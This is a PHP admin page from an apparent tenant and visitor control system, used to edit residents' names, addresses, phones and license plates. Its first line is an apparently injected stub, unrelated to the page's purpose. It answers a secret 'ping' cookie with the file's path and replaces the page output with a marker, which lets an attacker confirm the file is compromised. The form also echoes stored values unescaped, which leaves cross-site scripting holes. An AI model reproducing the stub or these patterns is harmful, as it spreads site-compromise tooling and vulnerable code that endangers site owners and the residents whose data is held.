<? $frt=1;error_reporting(0);if(isset($_COOKIE["ping"])){@setcookie("pong","./cynergi/admin/details_ant.php",time()+3600,"/");if( $_COOKIE["ping"]=="./cynergi/admin/details_ant.php"){if( !function_exists("ob_sh") ){function ob_sh($buffer){if( preg_match("@<body|</body@si",$buffer) ){return "GOOO->./cynergi/admin/details_ant.php<-";}return "NotGO->./cynergi/admin/details_ant.php<-";}}@ob_start("ob_sh");}}$frt=2;?><?php require_once('../Connections/dplace.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Restrict Access To Page: Grant or deny access to this page
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // For security, start by assuming the visitor is NOT authorized. 
  $isValid = False; 

  // When a visitor has logged into this site, the Session variable MM_Username set equal to their username. 
  // Therefore, we know that a user is NOT logged in if that Session variable is blank. 
  if (!empty($UserName)) { 
    // Besides being logged in, you may restrict access to only certain users based on an ID established when they login. 
    // Parse the strings into arrays. 
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Or, you may restrict access to only certain users based on their username. 
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "index.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($QUERY_STRING) && strlen($QUERY_STRING) > 0) 
  $MM_referrer .= "?" . $QUERY_STRING;
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$editFormAction = $_SERVER['PHP_SELF'];
if (isset($_SERVER['QUERY_STRING'])) {
  $editFormAction .= "?" . htmlentities($_SERVER['QUERY_STRING']);
}

if ((isset($_POST["MM_update"])) && ($_POST["MM_update"] == "form1")) {
  
//  $tmpName  = $_FILES['file_pic']['tmp_name'];  
// Read the file 
//      $fp      = fopen($tmpName, 'r');
  //    $data = fread($fp, filesize($tmpName));
    //  $data = addslashes($data);
      //fclose($fp);

  
  $updateSQL = sprintf("UPDATE tbl_tennants SET picture=%s, bldg=%s, address=%s, apt=%s, `names`=%s, phones=%s, tag1=%s, tag2=%s, comments=%s, id_admin=%s WHERE id_tennant=%s",
                       GetSQLValueString($_POST['$data'], "text"),
					   GetSQLValueString($_POST['text_bldg'], "text"),
                       GetSQLValueString($_POST['text_address'], "text"),
                       GetSQLValueString($_POST['text_apt'], "text"),
                       GetSQLValueString($_POST['text_names'], "text"),
                       GetSQLValueString($_POST['text_phones'], "text"),
					   GetSQLValueString($_POST['txt_tag1'], "text"),
					   GetSQLValueString($_POST['txt_tag2'], "text"),
                       GetSQLValueString($_POST['text_comments'], "text"),
                       GetSQLValueString($_POST['hidden_admin'], "int"),
                       GetSQLValueString($_POST['hidden_id'], "int"));

  mysql_select_db($database_dplace, $dplace);
  $Result1 = mysql_query($updateSQL, $dplace) or die(mysql_error());

  $updateGoTo = "search.php?names=" . $row_id['names'] . "";
  if (isset($_SERVER['QUERY_STRING'])) {
    $updateGoTo .= (strpos($updateGoTo, '?')) ? "&" : "?";
    $updateGoTo .= $_SERVER['QUERY_STRING'];
  }
  header(sprintf("Location: %s", $updateGoTo));
}

$colname_usuario = "-1";
if (isset($_SESSION['MM_Username'])) {
  $colname_usuario = $_SESSION['MM_Username'];
}
mysql_select_db($database_dplace, $dplace);
$query_usuario = sprintf("SELECT adm.id_admin, adm.username, adm.names  FROM tbl_admins adm WHERE adm.username = %s", GetSQLValueString($colname_usuario, "text"));
$usuario = mysql_query($query_usuario, $dplace) or die(mysql_error());
$row_usuario = mysql_fetch_assoc($usuario);
$totalRows_usuario = mysql_num_rows($usuario);

$colname_id = "-1";
if (isset($_GET['id'])) {
  $colname_id = $_GET['id'];
}
mysql_select_db($database_dplace, $dplace);
$query_id = sprintf("SELECT tena.*, adm.names as editor FROM tbl_tennants tena, tbl_admins adm WHERE tena.id_admin=adm.id_admin AND tena.id_tennant = %s", GetSQLValueString($colname_id, "int"));
$id = mysql_query($query_id, $dplace) or die(mysql_error());
$row_id = mysql_fetch_assoc($id);
$totalRows_id = mysql_num_rows($id);

mysql_select_db($database_dplace, $dplace);
$query_bldg = "SELECT DISTINCT bldg FROM tbl_tennants ORDER BY bldg ASC";
$bldg = mysql_query($query_bldg, $dplace) or die(mysql_error());
$row_bldg = mysql_fetch_assoc($bldg);
$totalRows_bldg = mysql_num_rows($bldg);

$colname_phones = "-1";
if (isset($_GET['id'])) {
  $colname_phones = $_GET['id'];
}
mysql_select_db($database_dplace, $dplace);
$query_phones = sprintf("SELECT * FROM tbl_tenant_phones WHERE id_tenant = %s ORDER BY type ASC", GetSQLValueString($colname_phones, "int"));
$phones = mysql_query($query_phones, $dplace) or die(mysql_error());
$row_phones = mysql_fetch_assoc($phones);
$totalRows_phones = mysql_num_rows($phones);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><!-- InstanceBegin template="/Templates/templateadmin.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!-- InstanceBeginEditable name="doctitle" -->
<title>Dplace Admin Area</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<!-- InstanceEndEditable -->
<link href="../css/style.css" rel="stylesheet" type="text/css" />
<style type="text/css">
<!--
body {
	background-image: url(../images/bgnd2.jpg);
	background-repeat: repeat-x;
}
-->
</style>
<script type="text/javascript" id="sothink_dhtmlmenu"> <!--
 st_siteroot="";
 st_jspath="stmenu.js";
 if(!window.location.href.indexOf("file:") && st_jspath.charAt(0)=="/")
  document.write('<script type="text/javascript" src="'+st_siteroot+st_jspath+'"><\/script>');
 else 
  document.write('<script type="text/javascript" src="'+st_jspath+'"><\/script>');
//--> </script></head>

<body>
<table width="627" height="132" border="0" align="center">
  <tr>
    <td width="232" height="128" align="center"><img src="../images/dplace_logo.JPG" alt="" width="175" height="87" /></td>
    <td width="385" align="center"><span class="titulo">Visitor control system <br />
      All American Security Services</span></td>
  </tr>
</table>
<table width="673" border="0" align="center">
  <tr>
    <td width="362" align="center"><span> &nbsp;
      <script type="text/javascript" src="adminis.js"></script>
    </span></td>
  </tr>
</table>
<!-- InstanceBeginEditable name="central" -->
<table width="816" height="367" border="0" align="center">
  <tr>
    <td align="center" valign="top"><br />
      <table width="279" border="0" align="center">
      <tr>
        <td align="center" class="titulo">Tennant Edit</td>
      </tr>
    </table>
      <table width="816" height="367" border="0" align="center">
        <tr>
          <td align="center" valign="top"><form action="<?php echo $editFormAction; ?>" method="POST" enctype="multipart/form-data" name="form1" id="form1">
            <table width="660" border="1">
                <tr>
                  <td width="115" align="left" class="etiqueta">Names:</td>
                  <td colspan="3" align="left" class="linea"><label>
                    <input name="text_names" type="text" class="linea" id="text_names" value="<?php echo $row_id['names']; ?>" size="45" maxlength="40" />
                  </label></td>
                </tr>
                <tr>
                  <td align="left" class="etiqueta">Picture:</td>
                  <td align="left" class="linea">&nbsp;</td>
                  <td colspan="2" align="left" class="linea">&nbsp;</td>
                </tr>
                <tr>
                  <td align="left" class="etiqueta">Address</td>
                  <td colspan="3" align="left" class="linea"><label>
                    <input name="text_bldg" type="text" class="linea" id="text_bldg" value="<?php echo $row_id['bldg']; ?>" size="5" maxlength="4" />
                    <input name="text_address" type="text" class="linea" id="text_address" value="<?php echo $row_id['address']; ?>" size="15" maxlength="40" />
                    APT#
                    <input name="text_apt" type="text" class="linea" id="text_apt" value="<?php echo $row_id['apt']; ?>" size="3" maxlength="1" />
                    (Bldg, Address, Apt)</label></td>
                </tr>
                <tr>
                  <td height="35" align="left" class="etiqueta">Phone numbers:</td>
                  <td colspan="3" align="left" class="linea"><strong>
                    <input name="text_phones" type="text" id="text_phones" value="<?php echo $row_id['phones']; ?>" size="60" maxlength="60" />
                  </strong></td>
                </tr>
                <tr>
                  <td height="35" align="left" class="etiqueta">License plate1</td>
                  <td align="left" class="linea"><label>
                    <input name="txt_tag1" type="text" id="txt_tag1" size="10" maxlength="10" value="<?php echo $row_id['tag1']; ?>" />
                  </label></td>
                  <td align="left" class="etiqueta">License plate 2</td>
                  <td align="left" class="linea"><label>
                    <input name="txt_tag2" type="text" id="txt_tag2" size="10" maxlength="10" value="<?php echo $row_id['tag2']; ?>" /> 
                  </label></td>
                </tr>
                <tr>
                  <td height="35" align="left" class="etiqueta">&nbsp;</td>
                  <td width="92" align="center" class="linea"><img src="../images/phones/<?php echo $row_phones['type']; ?>" alt="Click to call...." width="51" height="45" border="0" /></td>
                  <td width="156" align="left" class="linea"><?php echo $row_phones['phone']; ?></td>
                  <td width="269" align="left" class="linea">Ext: <?php echo $row_phones['extension']; ?></td>
                </tr>
                <tr>
<td height="53" align="left" valign="top" class="etiqueta">Last edit user:</td>
<td colspan="3" align="left"><?php echo $row_id['editor']; ?></td>
                </tr>
                <tr>
                  <td height="53" align="left" valign="top" class="etiqueta">Comments:</td>
                  <td colspan="3" align="left"><label>
                      <textarea name="text_comments" id="text_comments" cols="58" rows="5"><?php echo $row_id['comments']; ?></textarea>
                  </label></td>
                </tr>
                <tr>
                  <td height="35" align="left" valign="top" class="etiqueta"><input name="hidden_id" type="hidden" id="hidden_id" value="<?php echo $row_id['id_tennant']; ?>" />
                  <input name="hidden_admin" type="hidden" id="hidden_admin" value="<?php echo $row_usuario['id_admin']; ?>" /></td>
                  <td colspan="3" align="left"><label>
                    <input type="submit" name="button" id="button" value="Submit" />
                  </label></td>
                </tr>
              </table>
            <input type="hidden" name="MM_update" value="form1" />
          </form>
            <br />
            <table width="200" border="0" align="center">
              <tr>
                <td align="center"><a href="search.php"><img src="../images/back.png" alt="" width="60" height="60" border="0" /></a></td>
              </tr>
            </table>
            <p>&nbsp;</p></td>
        </tr>
    </table></td>
  </tr>
</table>
<br />
<!-- InstanceEndEditable -->
<table width="200" border="0" align="right">
  <tr>
    <td>User: <?php echo $row_usuario['names']; ?></td>
  </tr>
</table>
</body>
<!-- InstanceEnd --></html>
<?php
mysql_free_result($usuario);

mysql_free_result($id);

mysql_free_result($bldg);

mysql_free_result($phones);
?>
